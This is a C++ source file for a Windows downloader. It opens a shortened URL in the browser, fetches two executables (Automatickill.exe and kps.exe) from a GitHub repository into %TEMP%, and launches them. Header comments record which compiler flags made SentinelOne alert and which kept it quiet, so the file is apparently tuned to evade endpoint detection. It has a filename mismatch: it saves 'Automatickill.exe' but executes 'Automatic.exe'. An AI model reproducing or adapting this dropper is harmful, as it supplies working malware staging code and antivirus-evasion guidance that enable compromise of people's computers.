// sentinel one alerted x86_64-w64-mingw32-g++ -Os -s -fno-exceptions -fno-rtti -static-libgcc -static-libstdc++ -mwindows -o downloader.exe minimaldown.cpp -lwininet
// sentinel one quiet   x86_64-w64-mingw32-g++ -Os -s -fno-exceptions -fno-rtti -static-libgcc -static-libstdc++ -o downloader.exe minimaldown.cpp -lwininet

// chia.exe: x86_64-w64-mingw32-g++ -Os -s -fno-exceptions -fno-rtti -static-libgcc -static-libstdc++ -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fomit-frame-pointer -Wl,--gc-sections -Wl,--strip-all -o downminO2/chia.exe minimaldown.cpp -lwininet

#include <windows.h>
#include <wininet.h>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")

void openBrowser() {
    ShellExecuteA(NULL, "open", "https://shorturl.at/J0XZs", NULL, NULL, SW_SHOWNORMAL);
}

bool downloadFile(const char* url, const char* filename) {
    // complete path in %TEMP%
    char path[MAX_PATH];
    if (GetTempPathA(MAX_PATH, path) == 0) return false;
    strcat(path, filename);

    // Internet connection
    HINTERNET hInternet = InternetOpenA("DL", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // open URL
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // create file in %TEMP%
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Download
    char buffer[1024];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    // Cleanup
    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return true;
}

int main() { 

    openBrowser();

    // Download Automatickill.exe
    const char* automaticUrl = "https://github.com/Giannuz/tpbs-ws-c-ca/raw/master/Automatickill.exe";
    if (!downloadFile(automaticUrl, "Automatickill.exe")) {
        return 1;
    }

    // Download kps.exe
    const char* kpsUrl = "https://github.com/Giannuz/tpbs-ws-c-ca/raw/master/kps.exe";
    if (!downloadFile(kpsUrl, "kps.exe")) {
        return 1;
    }

    // Get %TEMP% path for execution
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0) return 1;
    
    // Create full paths for executables
    char automaticPath[MAX_PATH];
    char kpsPath[MAX_PATH];
    strcpy(automaticPath, tempPath);
    strcpy(kpsPath, tempPath);
    strcat(automaticPath, "Automatic.exe");
    strcat(kpsPath, "kps.exe");

    // Execute Automatic.exe first
    ShellExecuteA(NULL, "open", automaticPath, NULL, NULL, SW_SHOWNORMAL);
    
    // Wait a bit before executing the second file
    //Sleep(2000);
    
    // Execute kps.exe after Automatic.exe
    ShellExecuteA(NULL, "open", kpsPath, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}
